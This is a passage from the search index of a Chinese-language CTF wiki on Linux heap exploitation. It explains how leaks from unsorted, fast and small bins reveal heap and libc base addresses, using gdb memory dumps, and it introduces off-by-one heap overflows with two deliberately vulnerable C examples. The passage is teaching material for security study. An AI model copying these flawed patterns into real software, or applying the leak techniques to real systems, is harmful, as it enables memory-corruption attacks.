0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \u9996\u5148\u7b2c\u4e00\u4e2a\u662f\u4e3b\u6a21\u5757\u7684\u57fa\u5730\u5740\uff0c\u56e0\u4e3a\u53ea\u6709\u5728\u5f00\u542fPIE(\u5730\u5740\u65e0\u5173\u4ee3\u7801)\u7684\u60c5\u51b5\u4e0b\u4e3b\u6a21\u5757\u7684\u57fa\u5730\u5740\u624d\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u56e0\u6b64\u901a\u5e38\u60c5\u51b5\u4e0b\u4e3b\u6a21\u5757\u7684\u5730\u5740\u4e0d\u9700\u8981\u6cc4\u6f0f\u3002 \u7b2c\u4e8c\u4e2a\u662f\u5806\u5730\u5740\uff0c\u5806\u5730\u5740\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u6bcf\u6b21\u8fd0\u884c\u90fd\u4f1a\u6539\u53d8\uff0c\u5f53\u7136\u9700\u8981\u63a7\u5236\u5806\u4e2d\u7684\u6570\u636e\u65f6\u53ef\u80fd\u5c31\u9700\u8981\u5148\u6cc4\u6f0f\u5806\u57fa\u5730\u5740\u3002 \u7b2c\u4e09\u4e2a\u662flibc.so\u7684\u5730\u5740\uff0c\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u6709\u901a\u8fc7libc\u4e2d\u7684system\u7b49\u51fd\u6570\u624d\u80fd\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u5e76\u4e14malloc_hook\u3001one_gadgets\u3001IO_FILE\u7b49\u7ed3\u6784\u4e5f\u90fd\u50a8\u5b58\u5728libc\u4e2d\uff0c\u56e0\u6b64libc\u7684\u5730\u5740\u4e5f\u662f\u6211\u4eec\u6cc4\u6f0f\u7684\u76ee\u6807\u3002 \u901a\u8fc7\u4ec0\u4e48\u8fdb\u884c\u6cc4\u6f0f \u00b6 \u901a\u8fc7\u524d\u9762\u7684\u77e5\u8bc6\u6211\u4eec\u77e5\u9053heap\u5206\u4e3aunsorted bin\u3001fastbin\u3001smallbin\u3001large bin\u7b49\uff0c\u6211\u4eec\u9010\u4e2a\u8003\u5bdf\u8fd9\u4e9b\u7ed3\u6784\u6765\u67e5\u770b\u5982\u4f55\u8fdb\u884c\u6cc4\u6f0f\u3002 unsorted bin \u00b6 \u6211\u4eec\u6784\u9020\u4e24\u4e2aunsorted bin\u7136\u540e\u67e5\u770b\u5b83\u7684\u5185\u5b58\uff0c\u73b0\u5728\u5728unsorted bin\u94fe\u8868\u4e2d\u5b58\u5728\u4e24\u4e2a\u5757\uff0c\u7b2c\u4e00\u4e2a\u5757\u7684\u5730\u5740\u662f0x602000\u3001\u7b2c\u4e8c\u4e2a\u5757\u7684\u5730\u5740\u662f0x6020f0 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1b78 0x00000000006020f0 <=== \u6307\u5411\u4e0b\u4e00\u4e2a\u5757 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1b78 <=== \u6307\u5411main_arena 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 \u56e0\u6b64\u6211\u4eec\u77e5\u9053\u901a\u8fc7unsorted bin\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u67d0\u4e2a\u5806\u5757\u7684\u5730\u5740\u548cmain_areana\u7684\u5730\u5740\u3002\u4e00\u65e6\u83b7\u53d6\u5230\u67d0\u4e2a\u5806\u5757\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u901a\u8fc7malloc\u7684size\u8fdb\u884c\u8ba1\u7b97\u4ece\u800c\u83b7\u5f97\u5806\u57fa\u5730\u5740\u3002\u4e00\u65e6\u83b7\u53d6\u5230main_arena\u7684\u5730\u5740\uff0c\u56e0\u4e3amain_arena\u5b58\u5728\u4e8elibc.so\u4e2d\u5c31\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5f97\u51falibc.so\u7684\u57fa\u5730\u5740\u3002 \u56e0\u6b64\uff0c\u901a\u8fc7unsorted bin\u53ef\u4ee5\u83b7\u5f97\uff1a1.libc.so\u7684\u57fa\u5730\u5740 2.heap\u57fa\u5730\u5740 fastbin \u00b6 \u6211\u4eec\u6784\u9020\u4e86\u4e24\u4e2afastbin\u7136\u540e\u67e5\u770b\u5b83\u4eec\u7684\u5185\u5b58\uff0c\u73b0\u5728\u5728fastbin\u94fe\u8868\u4e2d\u5b58\u5728\u4e24\u4e2a\u5757\uff0c\u7b2c\u4e00\u4e2a\u5757\u7684\u5730\u5740\u662f0x602040\uff0c\u7b2c\u4e8c\u4e2a\u5757\u7684\u5730\u5740\u662f0x602000 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 0x602050: 0x0000000000602000 0x0000000000000000 <=== \u6307\u5411\u7b2c\u4e00\u4e2a\u5757 \u6839\u636e\u524d\u9762\u7684\u77e5\u8bc6\u6211\u4eec\u77e5\u9053fastbin\u94fe\u8868\u6700\u672b\u7aef\u7684\u5757fd\u57df\u4e3a0\uff0c\u6b64\u540e\u6bcf\u4e2a\u5757\u7684fd\u57df\u6307\u5411\u524d\u4e00\u4e2a\u5757\u3002\u56e0\u6b64\u901a\u8fc7fastbin\u53ea\u80fd\u6cc4\u6f0fheap\u7684\u57fa\u5730\u5740 smallbin \u00b6 \u6211\u4eec\u6784\u9020\u4e86\u4e24\u4e2afastbin\u7136\u540e\u67e5\u770b\u5b83\u4eec\u7684\u5185\u5b58\uff0c\u73b0\u5728\u5728fastbin\u94fe\u8868\u4e2d\u5b58\u5728\u4e24\u4e2a\u5757\uff0c\u7b2c\u4e00\u4e2a\u5757\u7684\u5730\u5740\u662f0x602000\uff0c\u7b2c\u4e8c\u4e2a\u5757\u7684\u5730\u5740\u662f0x6020f0 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1c38 0x00000000006020f0 <=== \u4e0b\u4e00\u4e2a\u5757\u7684\u5730\u5740 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1c38 <=== main_arena\u7684\u5730\u5740 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 \u56e0\u6b64\uff0c\u901a\u8fc7smallbin\u53ef\u4ee5\u83b7\u5f97\uff1a1.libc.so\u7684\u57fa\u5730\u5740 2.heap\u57fa\u5730\u5740 \u54ea\u4e9b\u6f0f\u6d1e\u53ef\u4ee5\u7528\u4e8e\u6cc4\u6f0f \u00b6 \u901a\u8fc7\u524d\u9762\u7684\u77e5\u8bc6\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5\u5806\u4e2d\u5b58\u5728\u54ea\u4e9b\u5730\u5740\u4fe1\u606f\uff0c\u4f46\u662f\u60f3\u8981\u83b7\u53d6\u5230\u8fd9\u4e9b\u5730\u5740\u9700\u8981\u901a\u8fc7\u6f0f\u6d1e\u6765\u5b9e\u73b0 \u4e00\u822c\u6765\u8bf4\u4ee5\u4e0b\u6f0f\u6d1e\u662f\u53ef\u4ee5\u8fdb\u884c\u4fe1\u606f\u6f0f\u6d1e\u7684 \u5806\u5185\u5b58\u672a\u521d\u59cb\u5316 \u5806\u6ea2\u51fa Use-After-Free \u8d8a\u754c\u8bfb heap extend","title":"\u901a\u8fc7\u5806\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f"},{"location":"pwn/heap/leak_heap/#_1","text":"","title":"\u901a\u8fc7\u5806\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f"},{"location":"pwn/heap/leak_heap/#_2","text":"\u5728CTF\u4e2d\uff0cPwn\u9898\u76ee\u4e00\u822c\u90fd\u662f\u8fd0\u884c\u5728\u8fdc\u7aef\u670d\u52a1\u5668\u4e0a\u7684\u3002\u56e0\u6b64\u6211\u4eec\u4e0d\u80fd\u83b7\u77e5\u670d\u52a1\u5668\u4e0a\u7684libc.so\u5730\u5740\u3001Heap\u57fa\u5730\u5740\u7b49\u5730\u5740\u4fe1\u606f\uff0c\u4f46\u662f\u5728\u8fdb\u884c\u5229\u7528\u7684\u65f6\u5019\u5f80\u5f80\u9700\u8981\u8fd9\u4e9b\u5730\u5740\uff0c\u6b64\u65f6\u5c31\u9700\u8981\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u3002","title":"\u4ec0\u4e48\u53eb\u4fe1\u606f\u6cc4\u6f0f"},{"location":"pwn/heap/leak_heap/#_3","text":"\u4fe1\u606f\u6cc4\u6f0f\u7684\u76ee\u6807\u6709\u54ea\u4e9b\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u5185\u5b58\u7a7a\u95f4\u6765\u83b7\u77e5\u8fd9\u4e00\u70b9 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/pwn 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/pwn 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/pwn 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \u9996\u5148\u7b2c\u4e00\u4e2a\u662f\u4e3b\u6a21\u5757\u7684\u57fa\u5730\u5740\uff0c\u56e0\u4e3a\u53ea\u6709\u5728\u5f00\u542fPIE(\u5730\u5740\u65e0\u5173\u4ee3\u7801)\u7684\u60c5\u51b5\u4e0b\u4e3b\u6a21\u5757\u7684\u57fa\u5730\u5740\u624d\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u56e0\u6b64\u901a\u5e38\u60c5\u51b5\u4e0b\u4e3b\u6a21\u5757\u7684\u5730\u5740\u4e0d\u9700\u8981\u6cc4\u6f0f\u3002 \u7b2c\u4e8c\u4e2a\u662f\u5806\u5730\u5740\uff0c\u5806\u5730\u5740\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u6bcf\u6b21\u8fd0\u884c\u90fd\u4f1a\u6539\u53d8\uff0c\u5f53\u7136\u9700\u8981\u63a7\u5236\u5806\u4e2d\u7684\u6570\u636e\u65f6\u53ef\u80fd\u5c31\u9700\u8981\u5148\u6cc4\u6f0f\u5806\u57fa\u5730\u5740\u3002 \u7b2c\u4e09\u4e2a\u662flibc.so\u7684\u5730\u5740\uff0c\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u6211\u4eec\u53ea\u6709\u901a\u8fc7libc\u4e2d\u7684system\u7b49\u51fd\u6570\u624d\u80fd\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u5e76\u4e14malloc_hook\u3001one_gadgets\u3001IO_FILE\u7b49\u7ed3\u6784\u4e5f\u90fd\u50a8\u5b58\u5728libc\u4e2d\uff0c\u56e0\u6b64libc\u7684\u5730\u5740\u4e5f\u662f\u6211\u4eec\u6cc4\u6f0f\u7684\u76ee\u6807\u3002","title":"\u4fe1\u606f\u6cc4\u6f0f\u7684\u76ee\u6807"},{"location":"pwn/heap/leak_heap/#_4","text":"\u901a\u8fc7\u524d\u9762\u7684\u77e5\u8bc6\u6211\u4eec\u77e5\u9053heap\u5206\u4e3aunsorted bin\u3001fastbin\u3001smallbin\u3001large bin\u7b49\uff0c\u6211\u4eec\u9010\u4e2a\u8003\u5bdf\u8fd9\u4e9b\u7ed3\u6784\u6765\u67e5\u770b\u5982\u4f55\u8fdb\u884c\u6cc4\u6f0f\u3002","title":"\u901a\u8fc7\u4ec0\u4e48\u8fdb\u884c\u6cc4\u6f0f"},{"location":"pwn/heap/leak_heap/#unsorted-bin","text":"\u6211\u4eec\u6784\u9020\u4e24\u4e2aunsorted bin\u7136\u540e\u67e5\u770b\u5b83\u7684\u5185\u5b58\uff0c\u73b0\u5728\u5728unsorted bin\u94fe\u8868\u4e2d\u5b58\u5728\u4e24\u4e2a\u5757\uff0c\u7b2c\u4e00\u4e2a\u5757\u7684\u5730\u5740\u662f0x602000\u3001\u7b2c\u4e8c\u4e2a\u5757\u7684\u5730\u5740\u662f0x6020f0 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1b78 0x00000000006020f0 <=== \u6307\u5411\u4e0b\u4e00\u4e2a\u5757 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1b78 <=== \u6307\u5411main_arena 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 \u56e0\u6b64\u6211\u4eec\u77e5\u9053\u901a\u8fc7unsorted bin\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u67d0\u4e2a\u5806\u5757\u7684\u5730\u5740\u548cmain_areana\u7684\u5730\u5740\u3002\u4e00\u65e6\u83b7\u53d6\u5230\u67d0\u4e2a\u5806\u5757\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u901a\u8fc7malloc\u7684size\u8fdb\u884c\u8ba1\u7b97\u4ece\u800c\u83b7\u5f97\u5806\u57fa\u5730\u5740\u3002\u4e00\u65e6\u83b7\u53d6\u5230main_arena\u7684\u5730\u5740\uff0c\u56e0\u4e3amain_arena\u5b58\u5728\u4e8elibc.so\u4e2d\u5c31\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5f97\u51falibc.so\u7684\u57fa\u5730\u5740\u3002 \u56e0\u6b64\uff0c\u901a\u8fc7unsorted bin\u53ef\u4ee5\u83b7\u5f97\uff1a1.libc.so\u7684\u57fa\u5730\u5740 2.heap\u57fa\u5730\u5740","title":"unsorted bin"},{"location":"pwn/heap/leak_heap/#fastbin","text":"\u6211\u4eec\u6784\u9020\u4e86\u4e24\u4e2afastbin\u7136\u540e\u67e5\u770b\u5b83\u4eec\u7684\u5185\u5b58\uff0c\u73b0\u5728\u5728fastbin\u94fe\u8868\u4e2d\u5b58\u5728\u4e24\u4e2a\u5757\uff0c\u7b2c\u4e00\u4e2a\u5757\u7684\u5730\u5740\u662f0x602040\uff0c\u7b2c\u4e8c\u4e2a\u5757\u7684\u5730\u5740\u662f0x602000 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 0x602050: 0x0000000000602000 0x0000000000000000 <=== \u6307\u5411\u7b2c\u4e00\u4e2a\u5757 \u6839\u636e\u524d\u9762\u7684\u77e5\u8bc6\u6211\u4eec\u77e5\u9053fastbin\u94fe\u8868\u6700\u672b\u7aef\u7684\u5757fd\u57df\u4e3a0\uff0c\u6b64\u540e\u6bcf\u4e2a\u5757\u7684fd\u57df\u6307\u5411\u524d\u4e00\u4e2a\u5757\u3002\u56e0\u6b64\u901a\u8fc7fastbin\u53ea\u80fd\u6cc4\u6f0fheap\u7684\u57fa\u5730\u5740","title":"fastbin"},{"location":"pwn/heap/leak_heap/#smallbin","text":"\u6211\u4eec\u6784\u9020\u4e86\u4e24\u4e2afastbin\u7136\u540e\u67e5\u770b\u5b83\u4eec\u7684\u5185\u5b58\uff0c\u73b0\u5728\u5728fastbin\u94fe\u8868\u4e2d\u5b58\u5728\u4e24\u4e2a\u5757\uff0c\u7b2c\u4e00\u4e2a\u5757\u7684\u5730\u5740\u662f0x602000\uff0c\u7b2c\u4e8c\u4e2a\u5757\u7684\u5730\u5740\u662f0x6020f0 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1c38 0x00000000006020f0 <=== \u4e0b\u4e00\u4e2a\u5757\u7684\u5730\u5740 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1c38 <=== main_arena\u7684\u5730\u5740 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 \u56e0\u6b64\uff0c\u901a\u8fc7smallbin\u53ef\u4ee5\u83b7\u5f97\uff1a1.libc.so\u7684\u57fa\u5730\u5740 2.heap\u57fa\u5730\u5740","title":"smallbin"},{"location":"pwn/heap/leak_heap/#_5","text":"\u901a\u8fc7\u524d\u9762\u7684\u77e5\u8bc6\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5\u5806\u4e2d\u5b58\u5728\u54ea\u4e9b\u5730\u5740\u4fe1\u606f\uff0c\u4f46\u662f\u60f3\u8981\u83b7\u53d6\u5230\u8fd9\u4e9b\u5730\u5740\u9700\u8981\u901a\u8fc7\u6f0f\u6d1e\u6765\u5b9e\u73b0 \u4e00\u822c\u6765\u8bf4\u4ee5\u4e0b\u6f0f\u6d1e\u662f\u53ef\u4ee5\u8fdb\u884c\u4fe1\u606f\u6f0f\u6d1e\u7684 \u5806\u5185\u5b58\u672a\u521d\u59cb\u5316 \u5806\u6ea2\u51fa Use-After-Free \u8d8a\u754c\u8bfb heap extend","title":"\u54ea\u4e9b\u6f0f\u6d1e\u53ef\u4ee5\u7528\u4e8e\u6cc4\u6f0f"},{"location":"pwn/heap/off_by_one/","text":"\u5806\u4e2d\u7684 Off-By-One \u00b6 \u4ecb\u7ecd \u00b6 \u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 off-by-one \u6f0f\u6d1e\u539f\u7406 \u00b6 off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef(\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1)\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002 \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8eLinux\u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002 \u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a(heap based)\u7684off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002 \u793a\u4f8b1 \u00b6 int my_gets(char *ptr,int size) { int i; for(i=0;i<=size;i++) { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2aoff-by-one\u6f0f\u6d1e\uff0c\u539f\u56e0\u662ffor\u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef wikipedia: \u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f30\u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u96943\u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u684810\u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u670910\u4e2a\u95f4\u9694\uff0c11\u6761\u6805\u680f\u67f1\u3002 \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5806\u5757 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u793a\u4f8b2 \u00b6 \u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898(\u4e0d\u8003\u8651\u6808\u6ea2\u51fa)\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002 \u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86off-by-one \u7684\u53d1\u751f\u3002 strlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 '\\x00' \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 '\\x00' \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411chunk1\u4e2d\u5199\u5165\u4e8625\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk \u5728\u6211\u4eec\u8f93\u5165'A'*24\u540e\u6267\u884cstrcpy 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400 \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 '\\x00' \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one\uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002 \u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684CPU\u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2aDWORD\u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684 DWORD 0x41424344 \u5185\u5b58 0x44,0x43,0x42,0x41 \u5c0f\u603b\u7ed3 \u00b6 \u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u5bfb\u627e off-by-one \u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4: \u6ce8\u610f\u5faa\u73af\u8fb9\u754c \u00b6 \u5728\u8fdb\u884c\u8bf8\u5982\u5faa\u73af\u5199\u5165\u7684\u64cd\u4f5c\u65f6\uff0c\u8981\u7279\u522b\u6ce8\u610f\u5faa\u73af\u7684\u6b21\u6570\u662f\u5426\u5b58\u5728\u8fb9\u754c\u95ee\u9898\u5bfc\u81f4\u7684 off-by-one\u3002 \u6ce8\u610f\u5b57\u7b26\u4e32\u64cd\u4f5c \u00b6 \u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u5904\u7406\u7684\u4e0d\u4e25\u8c28\u5f80\u5f80\u4f1a\u5bfc\u81f4 off-by-one 